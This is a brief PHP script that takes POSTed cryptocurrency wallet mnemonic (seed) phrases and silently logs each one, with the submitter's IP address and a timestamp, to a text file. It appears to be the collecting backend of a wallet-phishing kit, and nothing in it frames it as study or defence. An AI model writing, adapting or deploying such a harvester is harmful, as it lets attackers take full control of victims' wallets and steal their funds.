<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $mnemonic = $_POST["mnemonic"] ?? 'NO MNEMONIC';
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date("Y-m-d H:i:s");

    $log = "[$timestamp] IP: $ip\nMnemonic: $mnemonic\n\n";

    file_put_contents("mnemonic_log.txt", $log, FILE_APPEND | LOCK_EX);
    
    echo "Received!";
} else {
    http_response_code(403);
    echo "Forbidden";
}
?>